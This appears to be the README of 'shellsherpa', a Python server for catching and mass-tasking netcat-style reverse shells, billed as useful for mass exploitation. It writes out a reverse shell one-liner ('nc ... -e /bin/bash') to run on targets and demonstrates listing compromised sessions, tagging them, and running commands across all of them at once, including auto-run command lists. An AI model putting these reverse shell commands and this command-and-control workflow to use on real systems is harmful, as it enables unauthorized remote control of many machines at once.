# shellsherpa
A multi-client server for managing and mass tasking of simple socket reverse shells (nc/ncat/etc)

Useful when doing mass exploitation

```
usage: shellsherpa.py [-h] [--out OUT] [--pem PEM] [--key KEY] port

Manage shells

positional arguments:
  port        Port to listen on.

optional arguments:
  -h, --help  show this help message and exit
  --out OUT   Directory where to put output
  --pem PEM   Required to make it SSL. Path of PEM file
  --key KEY   Required to make it SSL. Path of key file.
```

Standard example (no output directory) to listen on 4444:
```
python3 shellsherpa.py 4444
-+- ShellSherpa -+-

> help

Documented commands (type help <topic>):
========================================
addtag      exit  removetag  sessions  settagautos
disconnect  help  run        settag    tags       
```

Then run any standard TCP shell on the target(s):
```
nc 192.168.1.51 4444 -e /bin/bash
```

Running commands:
```
...
> Connection: ('192.168.1.189', 60498)

> run * id

[0xc6wk4j - 192.168.1.189]: id.20200513202043
 uid=1000(bob) gid=1000(bob) groups=1000(bob)...
 
 >
```

Tags are used to distinguish between shells and allow the tasking of groups. Using `settag` to auto tag new shells with a given tag. Each shell automatically gets a tag with a UUID and its public IP:

```
## We already had a callback from 192.168.1.189
...
> settag bleh  # all new connections will get this tag
bleh> Connection: ('192.168.1.190', 60476)

bleh> sessions
+--------------+---------------+-------------------------------+
| Session UUID |       IP      |              Tags             |
+--------------+---------------+-------------------------------+
|   04x5fslb   | 192.168.1.189 |    04x5fslb, 192.168.1.189    |
|   0xc6wk4j   | 192.168.1.190 | 0xc6wk4j, 192.168.1.190, bleh | # Note how the new callback get the 'bleh' tag
+--------------+---------------+-------------------------------+
```

Use addtag and removetag to add or remove tags to groups/individual shells (by using their tags!). `*` can be used to selecting all shells.

settagautos will recieve a line seperated list of shell commands to run automatically on shells with a given tag. Its done this way if you will be shifting your default tag. 

Example file:
```
id
whoami
uname -a
```
